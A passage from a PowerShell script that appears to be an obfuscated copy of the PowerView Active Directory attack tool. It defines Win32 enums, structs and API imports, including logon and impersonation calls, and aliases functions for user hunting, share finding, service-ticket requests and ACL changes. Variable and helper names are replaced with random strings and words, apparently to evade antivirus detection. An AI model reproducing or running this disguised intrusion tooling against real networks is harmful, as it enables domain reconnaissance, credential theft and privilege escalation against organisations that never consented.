            $NwffJOfUHJC9y9O | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $NwffJOfUHJC9y9O | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $NwffJOfUHJC9y9O | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $NwffJOfUHJC9y9O
        }
        }
    }
}











$Mod = bootless -ModuleName Win32




$ioynBQMoodRObnd = Rumsfeld $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}


$txoxI9aTrtIfDHu = Rumsfeld $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield


$9HeFXhwjBUWerxx = Rumsfeld $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield


$MginMAhE9hWVzWd = Rumsfeld $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$kXSSdzfXNwjWASv = threatened $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $MginMAhE9hWVzWd
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}


$HTYS9ooELkxPUXE = threatened $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}


$DiOtNvBLwuT9TTW = threatened $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}


$sjlOqrVrfnMOkKP = threatened $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}


$EglVVHficmGx9gw = threatened $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}


$HxDJUnfW9tHIhCN = Rumsfeld $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


$UIWJeBULXAEkdPs = threatened $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}


$xuZBZnbfFMUecjN = threatened $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $HxDJUnfW9tHIhCN
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}


$DsDomainFlag = Rumsfeld $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$mcfYhAUgzKycJqF = Rumsfeld $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$dKd9heJPMyYWEU9 = Rumsfeld $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


$v9oXhIauHWMpHBt = threatened $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $mcfYhAUgzKycJqF
    TrustAttributes = field 5 $dKd9heJPMyYWEU9
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}


$npJBaIWRNRrVEFS = threatened $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($npJBaIWRNRrVEFS, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | racehorses -Module $Mod -Namespace 'Win32'
$fWPrzxt9Txhddkn = $Types['netapi32']
$JRe9dkTvhkNHAuS = $Types['advapi32']
$9KAJTjhDjLKRGcx = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

Set-Alias Get-IPAddress emaciates
Set-Alias Convert-NameToSid curlew
Set-Alias Convert-SidToName congesting
Set-Alias Request-SPNTicket embryologist
Set-Alias Get-DNSZone mettlesome
Set-Alias Get-DNSRecord irredeemable
Set-Alias Get-NetDomain forked
Set-Alias Get-NetDomainController milligram
Set-Alias Get-NetForest cannibalizes
Set-Alias Get-NetForestDomain unbridled
Set-Alias Get-NetForestCatalog ejected
Set-Alias Get-NetUser noshes
Set-Alias Get-UserEvent municipalities
Set-Alias Get-NetComputer eigenvalues
Set-Alias Get-ADObject ensnared
Set-Alias Set-ADObject similarity
Set-Alias Get-ObjectAcl software
Set-Alias Add-ObjectAcl enforcers
Set-Alias Invoke-ACLScanner rumble
Set-Alias Get-GUIDMap inhabitable
Set-Alias Get-NetOU Noelle
Set-Alias Get-NetSite fourteenths
Set-Alias Get-NetSubnet stingiest
Set-Alias Get-NetGroup offenses
Set-Alias Find-ManagedSecurityGroups sideshows
Set-Alias Get-NetGroupMember squiggles
Set-Alias Get-NetFileServer peels
Set-Alias Get-DFSshare footsteps
Set-Alias Get-NetGPO shuffling
Set-Alias Get-NetGPOGroup bang
Set-Alias Find-GPOLocation bustling
Set-Alias Find-GPOComputerAdmin miniaturizes
Set-Alias Get-LoggedOnLocal Hawaiians
Set-Alias Invoke-CheckLocalAdminAccess Boulez
Set-Alias Get-SiteName fillers
Set-Alias Get-Proxy Caucasians
Set-Alias Get-LastLoggedOn adjudging
Set-Alias Get-CachedRDPConnection lumberjacks
Set-Alias Get-RegistryMountedDrive epicenter
Set-Alias Get-NetProcess wholes
Set-Alias Invoke-ThreadedFunction overhanging
Set-Alias Invoke-UserHunter Hersey
Set-Alias Invoke-ProcessHunter divans
Set-Alias Invoke-EventHunter recessions
Set-Alias Invoke-ShareFinder symmetrical
Set-Alias Invoke-FileFinder replaced
Set-Alias Invoke-EnumerateLocalAdmin interrogatory
Set-Alias Get-NetDomainTrust cheerlessly
Set-Alias Get-NetForestTrust varied
Set-Alias Find-ForeignUser holding
Set-Alias Find-ForeignGroup location
Set-Alias Invoke-MapDomainTrust substitution
Set-Alias Get-DomainPolicy ablaze
